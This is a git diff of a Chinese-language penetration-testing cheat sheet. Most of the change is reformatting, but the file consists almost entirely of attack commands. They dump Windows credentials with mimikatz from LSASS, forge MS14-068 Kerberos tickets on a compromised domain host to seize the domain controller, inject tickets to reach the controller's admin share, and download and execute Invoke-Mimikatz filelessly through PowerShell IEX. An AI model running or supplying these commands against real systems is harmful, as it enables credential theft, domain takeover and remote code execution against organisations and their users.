@@ -22,12 +22,15 @@ mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit
 ```
 
 #### 三、mimikatz（管理员权限）
+
 ######结合procdump解密如上
+
 ######上传mimikatz.exe直接在目标机器上解密
 ```shell
 mimikatz.exe "privilege::debug" exit
 mimikatz.exe "sekurlsa::logonpasswords" exit
 ```
+
 ######mimikatz结合ms14-068拿域控（在域内肉鸡上执行）
 - 利用ms14-068生成cache
 ```shell
@@ -44,7 +47,8 @@ mimikatz.exe "kerberos::ptc TGT_zhangsan@DD11.com.ccache" exit //将票据注入
 net use \\A-635ECAEE64804.TEST.LOCAL //此处填域的名称
 dir \\A-635ECAEE64804.TEST.LOCAL\c$
 ```
-####通过powershell无文件加载mimikatz
+
+###### 通过powershell无文件加载mimikatz
 ```shell
 powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz
 ```
